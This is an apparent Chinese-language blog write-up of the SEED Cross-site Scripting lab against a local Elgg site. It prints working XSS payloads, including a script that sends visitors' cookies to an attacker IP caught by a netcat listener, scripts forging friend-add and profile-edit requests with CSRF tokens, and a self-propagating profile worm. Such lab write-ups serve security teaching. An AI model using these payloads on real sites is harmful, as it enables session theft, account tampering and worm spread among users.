@@ -1,0 +1,874 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/image/atom1.png">
+  <link rel="icon" href="/image/atom1.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#153b6e">
+  <meta name="author" content="郭佳明">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="无内鬼，整点前端 lab setup参考seed系列其他博客 Task 1: Posting a Malicious Message to Display an Alert Window通过在个人主页汇总嵌入JavaScript 程序，这样当其他用户查看个人主页时，将执行 JavaScript 程序并显示一个警告窗口  在brief description框中填入&lt;script&gt;ale">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SEED-lab：Cross-site Scripting Attack Lab">
+<meta property="og:url" content="http://gls.show/p/53d24de/index.html">
+<meta property="og:site_name" content="郭佳明的博客">
+<meta property="og:description" content="无内鬼，整点前端 lab setup参考seed系列其他博客 Task 1: Posting a Malicious Message to Display an Alert Window通过在个人主页汇总嵌入JavaScript 程序，这样当其他用户查看个人主页时，将执行 JavaScript 程序并显示一个警告窗口  在brief description框中填入&lt;script&gt;ale">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://gls.show/image/seed/seed2.0_vm.jpg">
+<meta property="article:published_time" content="2022-10-06T13:22:56.650Z">
+<meta property="article:modified_time" content="2023-05-06T15:39:29.912Z">
+<meta property="article:author" content="郭佳明">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://gls.show/image/seed/seed2.0_vm.jpg">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>SEED-lab：Cross-site Scripting Attack Lab - 郭佳明的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"gls.show","root":"/","version":"1.9.0","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>郭佳明的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/image/mountain1.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="SEED-lab：Cross-site Scripting Attack Lab"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-06 21:22" pubdate>
+          2022年10月6日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          29 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">SEED-lab：Cross-site Scripting Attack Lab</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    <!-- compatible with older versions-->
+                    本文最后更新于：2023年5月6日 晚上
+                  
+                
+              </p>
+            
+            <div class="markdown-body">
+              
+              <p>无内鬼，整点前端</p>
+<h1 id="lab-setup"><a href="#lab-setup" class="headerlink" title="lab setup"></a>lab setup</h1><p>参考seed系列其他博客</p>
+<h1 id="Task-1-Posting-a-Malicious-Message-to-Display-an-Alert-Window"><a href="#Task-1-Posting-a-Malicious-Message-to-Display-an-Alert-Window" class="headerlink" title="Task 1: Posting a Malicious Message to Display an Alert Window"></a>Task 1: Posting a Malicious Message to Display an Alert Window</h1><p>通过在个人主页汇总嵌入JavaScript 程序，这样当其他用户查看个人主页时，将执行 JavaScript 程序并显示一个警告窗口</p>
+<ul>
+<li>在brief description框中填入<code>&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</code></li>
+</ul>
+<p>如果想运行一个很长的 JavaScript，但是受到表单中可键入字符数量的限制，可以将 JavaScript 程序存储在一个独立js文件中，然后使用 &lt; script &gt; 标记中的 src 属性引用它</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span><br>    src=<span class="hljs-string">&quot;http://www.example.com/myscripts.js&quot;</span>&gt;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<h1 id="Task-2-Posting-a-Malicious-Message-to-Display-Cookies"><a href="#Task-2-Posting-a-Malicious-Message-to-Display-Cookies" class="headerlink" title="Task 2: Posting a Malicious Message to Display Cookies"></a>Task 2: Posting a Malicious Message to Display Cookies</h1><p>当其他用户查看个人主页时，用户的 cookie 将显示在警告窗口中:<code>&lt;script&gt;alert(document.cookie);&lt;/script&gt;</code></p>
+<h1 id="Task-3-Stealing-Cookies-from-the-Victim’s-Machine"><a href="#Task-3-Stealing-Cookies-from-the-Victim’s-Machine" class="headerlink" title="Task 3: Stealing Cookies from the Victim’s Machine"></a>Task 3: Stealing Cookies from the Victim’s Machine</h1><p>攻击者希望通过 JavaScript 代码将 cookie 发送给自己，可以如下构造js代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;script&gt;document.write(<span class="hljs-string">&#x27;&lt;img src=http://10.9.0.1:5555?c=&#x27;</span> + escape(document.cookie) + <span class="hljs-string">&#x27;&gt;&#x27;</span>); &lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<p>当 JavaScript 插入 img 标记时，浏览器尝试从 src 字段中的 URL 加载图像; 这导致向攻击者的机器发送 HTTP GET 请求，上面的 JavaScript 将 cookie 发送到攻击者ip的端口5555(IP 地址为10.9.0.1) ，在那里攻击者有一个 TCP 服务器监听相同的端口</p>
+<p>攻击者机器运行：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lknv 5555<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>-l Listen on a specified port and print any data received</li>
+<li>-v Produce more verbose output.</li>
+<li>-n 直接使用IP地址，而不通过域名服务器</li>
+<li>-k 当一个连接完成时，监听另一个连接</li>
+</ul>
+<p>攻击者shell：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lknv 5555</span><br>Listening on 0.0.0.0 5555<br>Connection received on 10.0.2.15 58018<br>GET /?c=Elgg%3D8fueaeqm5p111ufasemhhpep6n%3B%20elggperm%3Dzv6b-6-jXGHCHP6e8DaQqjlkyRIW883S HTTP/1.1<br>Host: 10.9.0.1:5555<br>User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0<br>Accept: image/webp,*/*<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Connection: keep-alive<br>Referer: http://www.seed-server.com/profile/alice<br></code></pre></td></tr></table></figure>
+
+<h1 id="Task-4-Becoming-the-Victim’s-Friend"><a href="#Task-4-Becoming-the-Victim’s-Friend" class="headerlink" title="Task 4: Becoming the Victim’s Friend"></a>Task 4: Becoming the Victim’s Friend</h1><p>编写一个 XSS 蠕虫，将 Samy 作为访问 Samy 页面的任何其他用户的朋友,这个蠕虫不会自我传播</p>
+<p>先用http live header抓一下加/删好友的包：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span>	http://www.seed-server.com/action/friends/add?friend=<span class="hljs-number">56</span>&amp;__elgg_ts=<span class="hljs-number">1665136694</span>,<span class="hljs-number">1665136694</span>&amp;__elgg_token=fd<span class="hljs-number">9</span>a<span class="hljs-number">9</span>_Ls<span class="hljs-number">7</span>UPwUtwEuzLjCg,fd<span class="hljs-number">9</span>a<span class="hljs-number">9</span>_Ls<span class="hljs-number">7</span>UPwUtwEuzLjCg<br><br><span class="hljs-attribute">GET</span>	http://www.seed-server.com/action/friends/remove?friend=<span class="hljs-number">56</span>&amp;__elgg_ts=<span class="hljs-number">1665136694</span>,<span class="hljs-number">1665136694</span>&amp;__elgg_token=fd<span class="hljs-number">9</span>a<span class="hljs-number">9</span>_Ls<span class="hljs-number">7</span>UPwUtwEuzLjCg,fd<span class="hljs-number">9</span>a<span class="hljs-number">9</span>_Ls<span class="hljs-number">7</span>UPwUtwEuzLjCg<br></code></pre></td></tr></table></figure>
+<p>根据上面请求依葫芦画瓢组织一下sendurl(注意一下url里面的friend和friends)</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>    window.onload = function () &#123;<br>        <span class="hljs-keyword">var</span> Ajax=<span class="hljs-keyword">null</span>;<br>        <br>        <span class="hljs-keyword">var</span> ts=<span class="hljs-string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.security.token.__elgg_ts;<br>        <span class="hljs-keyword">var</span> token=<span class="hljs-string">&quot;&amp;__elgg_token=&quot;</span>+elgg.security.token.__elgg_token;<br>        <br>        <span class="hljs-keyword">var</span> sendurl=<span class="hljs-string">&quot;http://www.seed-server.com/action/friends/add?friend=56&quot;</span> + ts + token;<br>        <br>        Ajax=<span class="hljs-keyword">new</span> XMLHttpRequest();<br>        Ajax.open(<span class="hljs-string">&quot;GET&quot;</span>, sendurl, <span class="hljs-keyword">true</span>);<br>        Ajax.send();<br>    &#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+<p>Question 1: Explain the purpose of Lines ¿and ¡, why are they are needed?（ts、token）</p>
+<p>是用作针对CSRF的安全措施的值，每次加载页面时它们都会更改，这里动态获取使用token实现认证</p>
+<p>Question 2: If the Elgg application only provide the Editor mode for the “About Me” field, i.e.,you cannot switch to the Text mode, can you still launch a successful attack?</p>
+<p>不能。编辑器模式添加了额外的 HTML 并更改了一些符号，比如<code>&lt;p&gt;</code></p>
+<h1 id="Task-5-Modifying-the-Victim’s-Profile"><a href="#Task-5-Modifying-the-Victim’s-Profile" class="headerlink" title="Task 5: Modifying the Victim’s Profile"></a>Task 5: Modifying the Victim’s Profile</h1><p>要求修改受害者的“about me”字段</p>
+<p>抓包，先看一下修改“about me”字段对应的post请求content字段中的内容：</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-comment">-----------------------------29413027072745719142433280896</span><br>Content-Disposition: form-data; <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;__elgg_token&quot;</span><br><br>B4kETnpwfAY<span class="hljs-number">-9</span>_DqgFrU3Q<br><span class="hljs-comment">-----------------------------29413027072745719142433280896</span><br>Content-Disposition: form-data; <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;__elgg_ts&quot;</span><br><br><span class="hljs-number">1665148744</span><br><span class="hljs-comment">-----------------------------29413027072745719142433280896</span><br>Content-Disposition: form-data; <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;name&quot;</span><br><br>Boby<br><span class="hljs-comment">-----------------------------29413027072745719142433280896</span><br>Content-Disposition: form-data; <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;description&quot;</span><br><br>&lt;p&gt;wndmd nmsl hhhhh&lt;/p&gt;<br><br><span class="hljs-comment">-----------------------------29413027072745719142433280896</span><br>Content-Disposition: form-data; <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;accesslevel[description]&quot;</span><br><br><span class="hljs-number">0</span><br><span class="hljs-comment">-----------------------------29413027072745719142433280896</span><br>Content-Disposition: form-data; <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;briefdescription&quot;</span><br><br>???????????!!!!!!!!!!!!!!<br><span class="hljs-comment">-----------------------------29413027072745719142433280896</span><br>Content-Disposition: form-data; <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;accesslevel[briefdescription]&quot;</span><br><br><span class="hljs-number">2</span><br><br><span class="hljs-comment">-----------------------------29413027072745719142433280896</span><br>Content-Disposition: form-data; <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;guid&quot;</span><br><br><span class="hljs-number">57</span><br><br></code></pre></td></tr></table></figure>
+
+<p>按照上面字段填充代码，主要问题在于content字符串的构造</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>    window.onload = function()&#123;<br>        <span class="hljs-keyword">var</span> userName=<span class="hljs-string">&quot;&amp;name=&quot;</span>+elgg.session.user.name;<br>        <span class="hljs-keyword">var</span> guid=<span class="hljs-string">&quot;&amp;guid=&quot;</span>+elgg.session.user.guid;<br>        <span class="hljs-keyword">var</span> ts=<span class="hljs-string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.security.token.__elgg_ts;<br>        <span class="hljs-keyword">var</span> token=<span class="hljs-string">&quot;&amp;__elgg_token=&quot;</span>+elgg.security.token.__elgg_token;<br>        <br>        <span class="hljs-keyword">var</span> content=token + ts + userName +<br>            <span class="hljs-string">&quot;&amp;description=IamAlice&amp;accesslevel[description]=2&quot;</span> + guid;<br>        <span class="hljs-keyword">var</span> samyGuid=<span class="hljs-number">56</span>;<br>        <span class="hljs-keyword">var</span> sendurl=<span class="hljs-string">&quot;http://www.seed-server.com/action/profile/edit&quot;</span>;<br>        <br>        <span class="hljs-keyword">if</span>(elgg.session.user.guid!=samyGuid)<br>        &#123;<br>            <span class="hljs-keyword">var</span> Ajax=<span class="hljs-keyword">null</span>;<br>            Ajax=<span class="hljs-keyword">new</span> XMLHttpRequest();<br>            Ajax.open(<span class="hljs-string">&quot;POST&quot;</span>, sendurl, <span class="hljs-keyword">true</span>);<br>            Ajax.setRequestHeader(<span class="hljs-string">&quot;Content-Type&quot;</span>,<br>                                  <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>);<br>            Ajax.send(content);<br>        &#125;<br>    &#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<p>以html形式输入到Alice的“about me”中，每一个看到Alice的主页的人的“about me”都会被修改</p>
+<p>Question 3: Why do we need Line ? Remove this line, and repeat your attack. Report and explainyour observation.</p>
+<p>防止Alice自己的“about me”被修改</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span> id=worm&gt;<br>    <span class="hljs-built_in">window</span>.onload = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">var</span> name=<span class="hljs-string">&quot;&amp;name=&quot;</span>+elgg.session.user.name;<br>        <span class="hljs-keyword">var</span> guid=<span class="hljs-string">&quot;&amp;guid=&quot;</span>+elgg.session.user.guid;<br>        <span class="hljs-keyword">var</span> ts=<span class="hljs-string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.security.token.__elgg_ts;<br>        <span class="hljs-keyword">var</span> token=<span class="hljs-string">&quot;__elgg_token=&quot;</span>+elgg.security.token.__elgg_token;<br>    <br>        <span class="hljs-keyword">var</span> description = <span class="hljs-string">&quot;&amp;description=&lt;p&gt;Your profile have been attacked!!!&lt;\/p&gt;&quot;</span>&#125;<br>        <span class="hljs-keyword">var</span> scriptstr = <span class="hljs-string">&quot;&lt;script type=\&quot;text\/javascript\&quot; id=worm&gt;&quot;</span> + <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;worm&quot;</span>).innerHTML + <span class="hljs-string">&quot;&lt;\/script&gt;&quot;</span>;<br>    <br>        <span class="hljs-keyword">var</span> content=token + ts + description + <span class="hljs-built_in">encodeURIComponent</span>(scriptstr) + guid + name;<br>    <br>        Ajax=<span class="hljs-keyword">new</span> XMLHttpRequest();<br>        Ajax.open(<span class="hljs-string">&quot;POST&quot;</span>,<span class="hljs-string">&quot;/action/profile/edit&quot;</span>,<span class="hljs-literal">true</span>);<br>        Ajax.setRequestHeader(<span class="hljs-string">&quot;Host&quot;</span>,<span class="hljs-string">&quot;www.xsslabelgg.com&quot;</span>);<br>        Ajax.setRequestHeader(<span class="hljs-string">&quot;Content-type&quot;</span>, <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>);<br>        Ajax.send(content);<br>    &#125;<br>&lt;/script&gt;<br><span class="hljs-comment">//引用自https://blog.csdn.net/qq_39678161/article/details/119908242</span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;worm&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="javascript"><span class="xml">    <span class="hljs-keyword">var</span> headerTag = <span class="hljs-string">&quot;&lt;script id=\&quot;worm\&quot; type=\&quot;text/javascript\&quot;&gt;&quot;</span>;</span></span><br><span class="javascript"><span class="xml">    <span class="hljs-keyword">var</span> jsCode = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;worm&quot;</span>).innerHTML;</span></span><br><span class="javascript"><span class="xml">    <span class="hljs-keyword">var</span> tailTag = <span class="hljs-string">&quot;&lt;/&quot;</span> + <span class="hljs-string">&quot;script&gt;&quot;</span>;</span></span><br><span class="javascript"><span class="xml">    <span class="hljs-keyword">var</span> wormCode = <span class="hljs-built_in">encodeURIComponent</span>(headerTag + jsCode + tailTag);</span></span><br><span class="javascript"><span class="xml">    <span class="hljs-built_in">window</span>.onload = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;</span></span><br><span class="javascript"><span class="xml">        <span class="hljs-keyword">var</span> userName=<span class="hljs-string">&quot;&amp;name=&quot;</span>+elgg.session.user.name;</span></span><br><span class="javascript"><span class="xml">        <span class="hljs-keyword">var</span> guid=<span class="hljs-string">&quot;&amp;guid=&quot;</span>+elgg.session.user.guid;</span></span><br><span class="javascript"><span class="xml">        <span class="hljs-keyword">var</span> ts=<span class="hljs-string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.security.token.__elgg_ts;</span></span><br><span class="javascript"><span class="xml">        <span class="hljs-keyword">var</span> token=<span class="hljs-string">&quot;&amp;__elgg_token=&quot;</span>+elgg.security.token.__elgg_token;</span></span><br><span class="javascript"><span class="xml">        </span></span><br><span class="javascript"><span class="xml">        <span class="hljs-keyword">var</span> content=token + ts + userName +</span></span><br><span class="javascript"><span class="xml">            <span class="hljs-string">&quot;&amp;description=&quot;</span> + wormCode + <span class="hljs-string">&quot;&amp;accesslevel[description]=2&quot;</span> + </span></span><br><span class="javascript"><span class="xml">            <span class="hljs-string">&quot;&amp;briefdescription=samy%20is%20my%20hero&amp;accesslevel[briefdescription]=2&quot;</span> +</span></span><br><span class="javascript"><span class="xml">            guid;</span></span><br><span class="javascript"><span class="xml">        <span class="hljs-keyword">var</span> samyGuid=<span class="hljs-number">59</span>;</span></span><br><span class="javascript"><span class="xml">        <span class="hljs-keyword">var</span> sendurl=<span class="hljs-string">&quot;http://www.seed-server.com/action/profile/edit&quot;</span>;</span></span><br><span class="javascript"><span class="xml">        </span></span><br><span class="javascript"><span class="xml">        <span class="hljs-keyword">if</span>(elgg.session.user.guid!=samyGuid)</span></span><br><span class="javascript"><span class="xml">        &#123;</span></span><br><span class="javascript"><span class="xml">            <span class="hljs-keyword">var</span> Ajax=<span class="hljs-literal">null</span>;</span></span><br><span class="javascript"><span class="xml">            Ajax=<span class="hljs-keyword">new</span> XMLHttpRequest();</span></span><br><span class="javascript"><span class="xml">            Ajax.open(<span class="hljs-string">&quot;POST&quot;</span>, sendurl, <span class="hljs-literal">true</span>);</span></span><br><span class="javascript"><span class="xml">            Ajax.setRequestHeader(<span class="hljs-string">&quot;Content-Type&quot;</span>,</span></span><br><span class="javascript"><span class="xml">                                  <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>);</span></span><br><span class="javascript"><span class="xml">            Ajax.send(content);</span></span><br><span class="javascript"><span class="xml">        &#125;</span></span><br><span class="javascript"><span class="xml">    &#125;</span></span><br><span class="javascript"><span class="xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml">//引用自https://blog.csdn.net/l4kjih3gfe2dcba1/article/details/118768821</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://www.example.com/myscripts.js&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>可以在myscripts.js中插入恶意代码，例如：</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-string">&#x27;恶意代码已执行！&#x27;</span>);</span><br></code></pre></td></tr></table></figure>
+
+<p>当用户访问包含上述代码的网页时，恶意代码将被执行，弹出一个警告框</p>
